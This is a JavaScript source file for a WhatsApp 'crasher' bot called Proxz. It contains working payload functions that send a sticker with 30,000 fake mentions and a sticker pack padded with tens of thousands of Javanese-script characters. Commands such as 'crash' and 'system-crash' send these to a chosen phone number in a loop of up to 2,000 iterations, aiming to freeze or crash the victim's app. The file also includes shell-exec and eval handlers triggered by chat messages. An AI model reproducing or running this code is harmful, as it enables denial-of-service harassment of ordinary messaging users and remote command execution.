// Proxzz 𝗕𝘂𝗴 Version 1.0
// Created by JooDeveloperr [ # ]
// [ # ] No Rename Plc :>
// =======================


const crypto = require("crypto")

module.exports = async (Proxz, m, store) => {
try {
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ""
	
const budy = (typeof m.text == 'string' ? m.text : '') 
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mek = fs.readFileSync("./media/Menu.jpg")
const Image = "https://img1.pixhost.to/images/6409/609986309_kremonhost.jpg"
const sender = m.sender;
const Music = "https://files.catbox.moe/k479go.mp3"
const Premium = JSON.parse(fs.readFileSync('./data/murbug.json'))
const isPremium = Premium.includes(m.sender)
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await Proxz.decodeJid(Proxz.user.id)
const isOwner = m.sender.split("@")[0] == global.owner ? true : m.fromMe ? true : false
const pushname = m.pushName || `${m.sender.split("@")[0]}`
const isBot = botNumber.includes(m.sender)
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson, resize, sleep } = require('./system/function.js')

m.isGroup = m.chat.endsWith("g.us")
m.metadata = m.isGroup ? (await Proxz.groupMetadata(m.chat).catch(_ => {}) || {}) : {}
m.isAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == m.sender) || false) : false
m.isBotAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == botNumber) || false) : false

// >~~~~~~~~ Fake Quoted ~~~~~~~~~~< //

const qchannel = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {
newsletterAdminInviteMessage: {newsletterJid: `120363224727395@newsletter`, newsletterName: `Proxz Official`, jpegThumbnail: "", caption: `𝗔𝗹𝘄𝗮𝘆𝘀 Prooxz`, inviteExpiration: 0 }}}

// >~~~~~~~~~~ Function ~~~~~~~~~~~< //

async function DelayStickerNew(Proxz, target) {
  const stickerUrl = "https://mmg.whatsapp.net/v/t62.15575-24/12403361_728544836168227_8186125427718522054_n.enc?ccb=11-4&oh=01_Q5Aa1gHBXGoY4nJ2M27pLZSUwWBxUGwDd0sR8TPg6SqZeDKKkA&oe=6847F87B&_nc_sid=5e03e0&mms3=true";

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: target,
      fromMe: true,
      id: Date.now().toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: "image/webp",
        fileSha256: "CH6V5MN2Xl1XBEvRJ67jUo9B7PHVtfZzwo6iHC7E1ps=",
        fileEncSha256: "AFVKkyq/7/LocJByT0980T5h2I9qJrXgcukoBiZzAZk=",
        mediaKey: "h/8FwRZdeuDLx/C9JQLZd2YeeXdxIUH2/PO9QqXwOTw=",
        fileLength: { low: 38444, high: 0, unsigned: true }, 
        directPath: "/v/t62.15575-24/12403361_728544836168227_8186125427718522054_n.enc?ccb=11-4&oh=01_Q5Aa1gHBXGoY4nJ2M27pLZSUwWBxUGwDd0sR8TPg6SqZeDKKkA&oe=6847F87B&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1746956112,
        firstFrameSidecar: "kk79ovc2beFGGA==",
        isAnimated: true,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        stickerSentTs: "1746957642619",
        contextInfo: {
          mentionedJid          
        }
      }
    }
  };

  await Proxz.relayMessage(target, stickerMsg.message, { messageId: stickerMsg.key.id });
  console.log(`[StickerDelay] Terkirim ke ${target}`);
}

async function Blank_Pack(target) {
let memeknya = "ꦾ".repeat(50000) + " ꦽ".repeat(5000);
    var messageContent = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
  stickerPackMessage: {
    stickerPackId: "b58c0f42-0d1f-48fc-a516-7821f4d8d7a0",
    name: "Proxz Blank" + memeknya,
    publisher: memeknya + `ꦾ`.repeat(5000),
    stickers: [
      {
        fileName: "rroK-d0l9EdduolvylB3XF6RKwnyiz0RKAQMWb7RMl4=.webp",
        isAnimated: false,
        emojis: [
          ""
        ],
        accessibilityLabel: "",
        isLottie: false,
        mimetype: "image/webp"
      },
      {
        fileName: "JWKop+ILOcOMUNvxzJ52pUKwzWEgMbYkKFlo-aBKcfY=.webp",
        isAnimated: false,
        emojis: [
          ""
        ],
        accessibilityLabel: "",
        isLottie: false,
        mimetype: "image/webp"
      }
    ],
    fileLength: "69832",
    fileSha256: "J1qUbwUO4z77FRY3YcJ2DsQkL+SLTYhvacH2jfcZZNk=",
    fileEncSha256: "2ZEtY/Lfza1MYM6yU7jvCNwFTsYKHLuU7d6XwX/1W5c=",
    mediaKey: "A192qGyrnYXtdftrXGS1/R/3qcB6wG46ybFNvuXw0w8=",
    directPath: "/v/t62.15575-24/27352554_9405543626240762_2450036504553609989_n.enc?ccb=11-4&oh=01_Q5Aa1QFxiY3tujF8LmhWFx_gf4uMfQ2e544QIygRxw6wqt78cw&oe=68406780&_nc_sid=5e03e0",
    contextInfo: {},
    mediaKeyTimestamp: "1746459896",
    trayIconFileName: "b58c0f42-0d1f-48fc-a516-7821f4d8d7a0.png",
    thumbnailDirectPath: "/v/t62.15575-24/11410555_1219244196575326_7771742087005735253_n.enc?ccb=11-4&oh=01_Q5Aa1QEE9w6Kxf3WA3mH-_CcLiRcGVM29PNP1OJ9Z-kwv1mzwg&oe=684036A4&_nc_sid=5e03e0",
    thumbnailSha256: "UJxXSKrCVS9g/e/Ai39k62XEeTETrof25srXus8fkSA=",
    thumbnailEncSha256: "ufsZpeTyo10n1OPuYUsqPO01W6/vTrSepULAicGOFi8=",
    thumbnailHeight: 252,
    thumbnailWidth: 252,
    imageDataHash: "M2UxNGQzOGE0NThhM2VmNWFkYTUyZmQ3NzE0MWMwNWZjZjkwODM3NjFjOTY4MDljZjVhOWY0ZWVmZGU3ZWI3YQ==",
    stickerPackSize: "69233",
    stickerPackOrigin: "USER_CREATED"
              },
            },
          },
        }),
        {
          userJid: target,
        }
      );
await Proxz.relayMessage(target, messageContent.message, {
        participant: {
          jid: target,
        },
        messageId: messageContent.key.id,
      });
      console.log(chalk.green(`Send Bug By Proxz : ${target}`));
    }

const example = async (teks) => {
const commander = ` *Contoh Command :*\n*${cmd}* ${teks}`
return m.reply(commander)
}

const capital = (string) => {
return string.charAt(0).toUpperCase() + string.slice(1);
}

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`FROM`), chalk.blue.bold(`${m.sender.split("@")[0]}`), chalk.blue.bold(`TEXT :`), chalk.blue.bold(`${cmd}`))
}

switch (command) {
case "proxz":
case "menu": {
  const anjay = ` 
𝗣 𝗥 𝗢 𝗫 𝗭  𝗖 𝗥 𝗔 𝗦 𝗛🧬

\`⌜ 𝗔𝗯𝗼𝘂𝘁 𝗦𝗰𝗿𝗶𝗽𝘁 ⌟\`
▢ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗣𝗿𝗼𝘅𝘇 𝗖𝗿𝗮𝘀𝗵𝗲𝗿
▢ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 𝗡𝗮𝗺𝗲 : 𝗣𝗿𝗼𝘅𝘇 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹
▢ 𝗕𝗼𝘁 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 𝟭.𝟬.𝟬
▢ 𝗧𝘆𝗽𝗲 : 𝗡𝗼 𝗕𝘂𝘁𝘁𝗼𝗻

\`⌜ 𝗕𝗼𝘁 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 ⌟\`
𖣖 .𝗜𝗻𝘃𝗶𝘀 𝟲𝟮
𖣖 .𝗖𝗿𝗮𝘀𝗵 𝟲𝟮
𖣖 .𝗗𝗲𝗹𝗮𝘆-𝗵𝗮𝗿𝗱 𝟲𝟮
𖣖 .𝗣𝗿𝗼𝘅𝘇-𝗰𝗿𝗮𝘀𝗵 𝟲𝟮
𖣖 .𝗜𝗻𝘃𝗶𝘀𝗯𝗹𝗲 𝟲𝟮
𖣖 .𝗨𝗶-𝘀𝗶𝘀𝘁𝗲𝗺 𝟲𝟮
𖣖 .𝗦𝘆𝘀𝘁𝗲𝗺-𝗰𝗿𝗮𝘀𝗵 𝟲𝟮
𖣖 .𝗖𝗼𝗺𝗯𝗼-𝗰𝗿𝗮𝘀𝗵
`;

  // Kirim animasi gifplayback (MP4)
  await Proxz.sendMessage(m.chat, {
    video: fs.readFileSync('./thumbnail/animation.mp4'), // pastikan file ada dan valid
    gifPlayback: true,
    caption: anjay,
    mentions: [sender]
  }, {
    quoted: qchannel
  });

  // Kirim audio push-to-talk
  await Proxz.sendMessage(m.chat, {
    audio: { url: `https://files.catbox.moe/jimf8i.mp4` },
    mimetype: 'audio/mp4',
    ptt: true
  }, {
    quoted: qchannel
  });

}
break;
case "invis":
case "crash":
case "delay-hard":
case "invisble":
case "ui-sistem":
case "system-crash":
case "combo-crash":
case "proxz-crash": {
    if (!isOwner && !isPremium) return m.reply("𝗞𝗵𝘂𝘀𝘂𝘀 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗗𝗮𝗻 𝗢𝘄𝗻𝗲𝗿");

    if (!text) {
        return await Proxz.sendMessage(m.chat, { text: `*ᴄᴏɴᴛᴏʜ: .${command} 𝟼𝟸xx*` });
    }

    const target = text.trim();

    if (!target || isNaN(target)) {
        return await Proxz.sendMessage(m.chat, { text: "ᴛᴀʀɢᴇᴛ ᴠᴀʟɪᴅ" });
    }

    const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const check = await Proxz.onWhatsApp(org.split("@")[0]);

    if (!check[0]?.exists) {
        return await Proxz.sendMessage(m.chat, { text: "ᴛᴀʀɢᴇᴛ ᴠᴀʟɪᴅ" });
    }

    // Kirim pesan awal proses
    await Proxz.sendMessage(m.chat, {
        video: { url: "https://files.catbox.moe/jimf8i.mp4" },
        caption: "𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴...",
        contextInfo: {
            externalAdReply: {
                title: `𝗦𝗲𝗻𝗱𝗶𝗻𝗴 . . .`,
                body: "𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀",
                sourceUrl: "https://joozxdev.my.id",
            },
        },
    });

    const total = 2000;

    for (let i = 0; i < total; i++) {
        if (i === 10) {
            // Kirim pesan selesai di chat tempat perintah diketik
            await Proxz.sendMessage(m.chat, {
                video: { url: "https://files.catbox.moe/jimf8i.mp4" },
                caption: `✅ 𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴...`,
                contextInfo: {
                    externalAdReply: {
                        title: `𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀`,
                        body: "𝗪𝗮𝗶𝘁 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 . . .",
                        sourceUrl: "https://joozxdev.my.id",
                    },
                },
            });
        }
        
     DelayStickerNew(Proxz, org); 
     await Blank_Pack(target);
      await sleep(1000);
    }
}
break;


// >~~~~~~~~~ Command ~~~~~~~~~~< //

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break
// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

default:
if ((m.text).startsWith('$')) {
if (!isOwner && !isPremium) return
exec(budy.slice(2), (err, stdout) => {
if(err) return Proxz.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return Proxz.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith("=>")) {
if (!isOwner && !isPremium) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return Proxz.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return Proxz.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith(">")) {
if (!isOwner && !isPremium) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
Proxz.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
Proxz.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

}} catch (e) {
console.log(e)
Proxz.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyan("File Update => "),
chalk.cyan.bgBlue.bold(`${__filename}`))
delete require.cache[file]
require(file)
})